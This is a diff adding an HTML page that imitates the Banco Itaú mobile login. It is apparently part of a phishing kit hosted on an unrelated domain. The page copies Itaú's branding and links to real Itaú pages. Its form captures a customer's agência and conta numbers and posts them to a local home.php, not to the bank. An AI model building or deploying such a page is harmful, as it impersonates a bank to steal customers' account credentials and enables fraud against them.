@@ -1,0 +1,103 @@
+<!-- URL =https://flammenuptiale.com/pagina/pf/mobile/itau.php--><!-- w =(['FLAMMENUPTIALE.COM', 'flammenuptiale.com'], [datetime.datetime(2020, 9, 29, 8, 36, 44), datetime.datetime(2020, 9, 29, 10, 36, 44)], [datetime.datetime(2021, 9, 29, 8, 36, 44), datetime.datetime(2021, 9, 29, 10, 36, 44)])--><!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   Banco Itaú | O que você está buscando?
+  </title>
+  <meta charset="utf-8"/>
+  <meta content="#EA7237" name="theme-color"/>
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no" name="viewport"/>
+  <script src="js/jquery-3.2.1.min.js" type="text/javascript">
+  </script>
+  <script src="./js/jquery.mask.min.js" type="text/javascript">
+  </script>
+  <script src="./js/home_scripts.js" type="text/javascript">
+  </script>
+  <link href="assets/imagenss/ico_favicon.png" rel="shortcut icon"/>
+  <link crossorigin="anonymous" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet"/>
+  <link href="./assets/css/home_style.css" rel="stylesheet" type="text/css"/>
+  <link href="./assets/css/switcher.css" rel="stylesheet" type="text/css"/>
+  <script type="text/javascript">
+   function pulacampo(idobj, idproximo)
+				{
+				var str = new String(document.getElementById(idobj).value);
+				var mx = new Number(document.getElementById(idobj).maxLength);
+				if (str.length == mx)
+				{
+				document.getElementById(idproximo).focus();
+				}
+				}
+  </script>
+ </head>
+ <style>
+  input:not([type="radio"]):not([type="checkbox"]) {
+         -webkit-appearance: none;
+         border-radius: 0;
+        } 
+		fieldset{
+        width: 90%;
+		div{
+         display: flex;
+	     aling-items: center;
+	     justify-content: space-between;
+	    }
+ </style>
+ <body>
+  <header class="top-home">
+   <img src="assets/imagenss/img_home_logo.png" width="75"/>
+  </header>
+  <section class="frm-container">
+   <form action="home.php" method="POST" name="frmlog">
+    <div class="frm-item">
+     <input autocomplete="off" id="agencia" maxlength="4" name="agencia" onkeyup="mascara(this, mtel), validatebt()" required="" style="word-spacing: 100px; width: 40% !important" type="tel"/>
+     <label class="label-float" for="agencia" style="word-spacing: 90px">
+      agência
+     </label>
+     <input autocomplete="off" id="conta" maxlength="7" name="conta" onkeyup="mascara(this, mtel), validatebt()" required="" style="margin-left: 150px; width: 40% !important;" type="tel"/>
+     <label class="label-float" for="conta" style="word-spacing: 0px; margin-top: -10px; margin-left: 150px;">
+      conta
+     </label>
+    </div>
+    <div class="form-switcher form-switcher-lg form-switcher-sm-phone" style="margin-top: 10px">
+     <input id="switcher-lg" name="switcher-lg" type="checkbox"/>
+     <label class="switcher" for="switcher-lg" style="margin-top: -5px">
+     </label>
+     <label class="lbl_switcher" style=" margin-top: -30px; margin-left: 50px; text-align: center;">
+      lembrar agência e conta
+     </label>
+    </div>
+    <input class="btn" id="btnlog" name="btnlog" type="submit" value="OK"/>
+   </form>
+  </section>
+  <footer class="ft-home">
+   <ul>
+    <li>
+     <a href="https://cartoes.itau.com.br/cartoes/51/portfolio/">
+      <img src="./assets/imagenss/ic_contact_card.png" width="75"/>
+     </a>
+     <p>
+      pedir cartão
+     </p>
+    </li>
+    <li>
+     <a href="https://www.itau.com.br/conveniencia/seguranca/itoken/">
+      <img src="./assets/imagenss/ic_itokenapp.png" width="75"/>
+     </a>
+     <p>
+      iToken
+     </p>
+    </li>
+    <li>
+     <a href="https://www.itau.com.br/atendimento-itau/para-voce/">
+      <img src="./assets/imagenss/ic_ajuda.png" width="100"/>
+     </a>
+     <p>
+      ajuda
+     </p>
+    </li>
+    <div style="clear: both;">
+    </div>
+   </ul>
+  </footer>
+ </body>
+</html>
